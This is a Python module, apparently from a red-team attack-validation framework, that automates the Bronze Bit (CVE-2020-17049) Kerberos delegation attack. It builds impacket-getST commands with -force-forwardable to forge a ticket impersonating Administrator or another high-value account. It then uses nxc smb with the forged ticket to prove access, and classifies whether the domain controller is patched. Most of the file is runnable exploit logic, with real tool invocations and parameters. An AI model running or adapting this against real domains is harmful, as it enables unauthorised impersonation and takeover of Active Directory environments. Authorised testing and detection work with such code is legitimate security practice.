"""Bronze Bit (CVE-2020-17049) validation executor -- T6/S1.

A service account holding ``msDS-AllowedToDelegateTo`` but NOT
``TrustedToAuthForDelegation`` (constrained delegation WITHOUT protocol transition)
gets a NON-forwardable S4U2self ticket, so S4U2proxy is refused. CVE-2020-17049:
with the service account's own key, ``getST -force-forwardable`` forges the
forwardable flag, enabling S4U2proxy to the allowed SPN while impersonating a
high-value principal.

    impacket-getST -spn <allowed_spn> -impersonate <HVT> -force-forwardable
        [-altservice <svc>/<host>] <dom>/<service$> -aesKey/-hashes <key>
    nxc smb <host> -k --use-kcache            (ticket-backed access = EXPLOITED)

This is a VALIDATION edge: it runs the real attack and **classifies** the target
(``exit 0 is never proof``) --
  * ``exploited``      -- forged ticket accepted + ticket-backed access (ok=True);
  * ``kdc_patched``    -- ``KRB_AP_ERR_MODIFIED`` (the KDC enforces CVE-2020-17049);
  * ``not_delegatable``-- ``KDC_ERR_BADOPTION`` (SPN not allowed / TGT not forwardable);
  * ``failed``         -- any other non-exploit outcome.
GOAD north's KDC is patched, so the lab result is a correct ``kdc_patched`` negative
validation (``verified_recipe=False`` -- no in-lab exploit). Non-mutating; no rollback.

Secret-safe: the service-account key is the operator credential (masked in every stored
argv via :func:`redact_argv`); the saved ticket stays engine-only (``_composed_products``)
and never reaches the receipt. The ``-altservice`` trick rewrites the service class on the
SAME host key (HTTP and CIFS on one host share that host's account key), so an HTTP
delegation yields a CIFS ticket for an SMB proof.
"""
from __future__ import annotations

from pathlib import Path
from typing import Any

from .. import netresolve, proof, states
from ..recommend import ParamSpec, ParamValue, values, recommended_spn
from .base import (ValidationExecutor, ExecutorContext, StepRecord, redact_argv,
                   Capability, CAP_CCACHE)
from . import _s4u_common as s4u


class BronzeBitExecutor(ValidationExecutor):
    technique = "BRONZE-BIT"
    technique_class = "delegation"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = False        # GOAD KDC is patched; classification proven, exploit not in-lab
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_IMPERSONATION_TGT})
    recipe_ref = ("CVE-2020-17049 BRONZE-BIT = impacket-getST -force-forwardable -spn "
                  "<allowed_spn> -impersonate <HVT> [-altservice <svc>/<host>] "
                  "<dom>/<service$> -aesKey/-hashes <key> -> nxc -k --use-kcache "
                  "(classifies exploited / kdc_patched / not_delegatable)")

    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        host = finding.host or ""
        return [
            ParamSpec(name="service_account", kind="principal_name",
                      description="The compromised service/computer account holding "
                                  "constrained delegation WITHOUT protocol transition "
                                  "(authenticates with its own key).",
                      recommended=ctx.config.username or "",
                      rationale="The operator runs as the compromised service account; "
                                "its key is the operator credential.", required=True),
            ParamSpec(name="impersonate", kind="escalation_target",
                      description="High-value principal to impersonate via forged S4U.",
                      recommended="Administrator",
                      rationale="High-value default; override per engagement."),
            ParamSpec(name="target_spn", kind="spn",
                      description="An SPN in the account's msDS-AllowedToDelegateTo "
                                  "(the S4U2proxy target).",
                      recommended=recommended_spn("http", host) if host else "HTTP/<target>",
                      rationale="The allowed SPN the delegation grants."),
            ParamSpec(name="altservice", kind="spn",
                      description="Optional service class to rewrite the ticket to on the "
                                  "SAME host (e.g. cifs/<host>) for an SMB proof.",
                      recommended=recommended_spn("cifs", host) if host else "",
                      rationale="HTTP and CIFS on one host share that host's key; altservice "
                                "yields a CIFS ticket for the nxc-smb proof.", required=False),
            ParamSpec(name="target_host", kind="target_host",
                      description="Host to access with the impersonation ticket (the proof).",
                      recommended=host,
                      rationale="The delegation target host."),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        principal = (params["service_account"].value if "service_account" in params
                     else None) or ctx.config.username or ""
        return {"domain": ctx.config.domain, "principal": principal}

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        alt = f" -altservice {v['altservice']}" if v.get("altservice") else ""
        return [
            f"impacket-getST -spn {v['target_spn']} -impersonate {v['impersonate']} "
            f"-force-forwardable{alt} <dom>/{v['service_account']} <key>   (KRB5CCNAME unset)",
            f"nxc smb {v['target_host']} -k --use-kcache   (classify exploited/kdc_patched/not_delegatable)",
        ]

    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        svc, impersonate = v["service_account"], v["impersonate"]
        spn, altservice, target_host = v["target_spn"], v.get("altservice"), v["target_host"]
        out_dir = Path(ctx.output_dir); out_dir.mkdir(parents=True, exist_ok=True)
        steps: list[StepRecord] = []
        errors: list[str] = []

        def rec(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        getst_argv = ["impacket-getST", "-spn", spn, "-impersonate", impersonate,
                      "-force-forwardable", "-dc-ip", cfg.dc_ip]
        if altservice:
            getst_argv += ["-altservice", altservice]
        getst_argv += s4u.getst_key_flags(cfg) + [s4u.op_auth_target(cfg, svc)]
        res = ctx.runner.run(getst_argv, timeout=cfg.tool_timeout_s,
                             env={"KRB5CCNAME": None}, cwd=str(out_dir))
        ticket = s4u.parse_ticket(res.stdout or "", out_dir)

        if ticket is None:
            # No forged ticket: CLASSIFY the target from the Kerberos error (the carrier).
            reason = s4u.classify_kerberos_failure((res.stdout or "") + "\n" + (res.stderr or "")) \
                or "failed"
            rec("getST_force_forwardable", getst_argv, res, False, note=reason)
            errors.append(reason)
            return self._result(steps, errors, None, False, svc, impersonate, spn,
                                target_host, reason, cfg)
        rec("getST_force_forwardable", getst_argv, res, True, note="forged ticket accepted")

        nxc_argv = ["nxc", "smb", target_host, "-k", "--use-kcache",
                    *netresolve.nxc_kerberos_flags(cfg)]
        res = ctx.runner.run(nxc_argv, timeout=cfg.tool_timeout_s,
                             env={"KRB5CCNAME": ticket}, cwd=str(out_dir))
        out = res.stdout or ""
        access = bool(s4u.PWNED_RE.search(out) or s4u.AUTH_RE.search(out))
        rec("nxc_access", nxc_argv, res, access,
            note="pwn3d" if s4u.PWNED_RE.search(out) else "auth" if access else "")
        if not access:
            diag = netresolve.classify_resolution_failure(cfg, target_host, out + "\n" + (res.stderr or ""))
            if diag:
                errors.append(diag)
            errors.append("nxc_access_failed")
        classification = "exploited" if access else "forged_no_access"
        art = self._result(steps, errors, ticket, access, svc, impersonate, spn,
                           target_host, classification, cfg)
        if access:
            art["_composed_products"] = {"ccache": ticket, "principal": impersonate}
        return art

    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        prod = artifact.get("_composed_products") or {}
        ccache = prod.get("ccache")
        if not artifact.get("complete") or not ccache:
            return []
        return [Capability(state=states.S_IMPERSONATION_TGT, channel=CAP_CCACHE,
                           value=ccache, principal=prod.get("principal"))]

    def _result(self, steps, errors, ticket, ok, svc, impersonate, spn, target_host,
                classification, cfg) -> dict:
        terminal = proof.build_terminal_fact(
            self.terminal_kind, ok=ok, impersonated=impersonate,
            predicate=(f"Bronze Bit (CVE-2020-17049) as {cfg.domain}\\{svc} -> impersonate "
                       f"{impersonate} to {spn}: {classification}"
                       + (f"; ticket-backed access on {target_host}" if ok else "")),
            proof_token=proof.proof_token("BRONZE-BIT", cfg.domain, svc, impersonate,
                                          target_host, classification),
            extra={"classification": classification, "target_host": target_host},
        )
        return {"steps": [s.as_step() for s in steps],
                "gate": {"classifier": "not_required", "op": None},
                "mutation": {"applied": False,
                             "rollback": {"performed": False, "method": None, "verified": True}},
                "terminal_fact": terminal, "complete": bool(ok), "errors": errors}
